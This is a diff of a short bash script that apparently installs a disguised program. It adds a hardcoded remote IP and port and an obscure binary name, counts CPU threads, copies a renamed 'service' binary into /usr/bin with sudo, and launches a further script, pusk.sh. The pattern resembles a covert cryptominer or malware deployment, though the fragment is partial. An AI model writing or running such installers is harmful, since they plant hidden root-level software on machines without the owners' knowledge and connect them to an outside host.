@@ -1,4 +1,7 @@
 #!/bin/bash
+IPADR="95.216.187.139:4500"
+MNRCO="vnbrerr"
+
 
 ID="$(hostname)"
 THREADS="$(nproc --all)"
@@ -26,11 +29,7 @@ cd /tmp/none
 
 
 chmod 777 ./*.sh
-sudo dos2unix paparm.sh
-sudo ./paparm.sh
 
-export IPADR
-export MNRCO
 mv service $MNRCO
 chmod +x /tmp/none/$MNRCO
 sudo cp /tmp/none/$MNRCO /usr/bin/$MNRCO
@@ -40,5 +39,3 @@ sleep 3
 sudo dos2unix pusk.sh
 
 . ./pusk.sh
-
-
